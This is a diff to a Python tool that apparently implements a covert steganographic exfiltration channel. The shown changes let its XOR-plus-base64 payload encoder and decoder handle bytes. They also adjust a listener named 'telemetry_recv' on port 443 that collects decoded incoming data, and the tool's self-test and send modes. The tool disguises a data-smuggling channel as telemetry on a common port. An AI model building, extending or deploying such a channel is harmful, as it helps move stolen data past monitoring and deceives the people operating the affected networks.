@@ -49,17 +49,18 @@ def _compress(data: bytes) -> bytes:
 def _decompress(data: bytes) -> bytes:
     return zlib.decompress(data)
 
-def _encode_payload(plaintext: str, key: str = "wizza") -> bytes:
-    """Compress → XOR encrypt → base64."""
-    compressed = _compress(plaintext.encode())
+def _encode_payload(plaintext, key: str = "wizza") -> bytes:
+    """Compress → XOR encrypt → base64. Accepts str or bytes."""
+    raw = plaintext.encode() if isinstance(plaintext, str) else plaintext
+    compressed = _compress(raw)
     encrypted  = _xor(compressed, key.encode())
     return base64.b64encode(encrypted)
 
-def _decode_payload(b64_data: bytes, key: str = "wizza") -> str:
-    """Reverse of _encode_payload."""
+def _decode_payload(b64_data: bytes, key: str = "wizza") -> bytes:
+    """Reverse of _encode_payload. Returns bytes."""
     encrypted  = base64.b64decode(b64_data)
     compressed = _xor(encrypted, key.encode())
-    return _decompress(compressed).decode()
+    return _decompress(compressed)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -461,7 +462,7 @@ def telemetry_recv(bind_host: str = "0.0.0.0", bind_port: int = 443,
                     decoded = _decode_payload(encoded.encode(), key)
                     results.append(decoded)
                     print(f"[+] [{datetime.now().strftime('%H:%M:%S')}] "
-                          f"Received: {decoded[:100]}")
+                          f"Received: {decoded[:100]!r}")
                     del sessions[sess]
             except Exception as e:
                 pass
@@ -611,11 +612,11 @@ if __name__ == "__main__":
 
     if args.mode == "test":
         print("[*] Self-test: encode/decode round-trip")
-        msg = "WiZZA stego channel test — CONFIDENTIAL"
+        msg = b"WiZZA stego channel test -- CONFIDENTIAL"
         enc = _encode_payload(msg)
         dec = _decode_payload(enc)
         assert dec == msg, f"FAIL: {dec!r} != {msg!r}"
-        print(f"[+] encode/decode OK: {dec}")
+        print(f"[+] encode/decode OK: {dec.decode()}")
 
     elif args.mode == "send":
         stego_send(args.payload, args.channel,
